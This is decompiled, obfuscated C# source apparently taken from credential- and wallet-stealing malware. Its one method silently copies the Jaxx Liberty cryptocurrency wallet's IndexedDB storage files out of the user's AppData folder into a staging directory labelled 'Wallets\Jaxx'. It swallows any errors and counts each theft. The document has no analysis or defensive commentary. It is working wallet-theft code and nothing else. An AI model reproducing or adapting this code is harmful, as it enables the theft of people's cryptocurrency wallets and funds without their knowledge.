using System;
using System.IO;
using Moist;

// Token: 0x02000061 RID: 97
internal class Class34
{
	// Token: 0x06000258 RID: 600 RVA: 0x00012E64 File Offset: 0x00011064
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class34.string_0);
				fileInfo.CopyTo(string_1 + Class34.string_0 + fileInfo.Name);
			}
			Class34.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000259 RID: 601 RVA: 0x0000446C File Offset: 0x0000266C
	public Class34()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0600025A RID: 602 RVA: 0x000052CD File Offset: 0x000034CD
	// Note: this type is marked as 'beforefieldinit'.
	static Class34()
	{
		Class40.gcO0h7LzslQIW();
		Class34.int_0 = 0;
		Class34.string_0 = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}

	// Token: 0x04000112 RID: 274
	public static int int_0;

	// Token: 0x04000113 RID: 275
	public static string string_0;
}
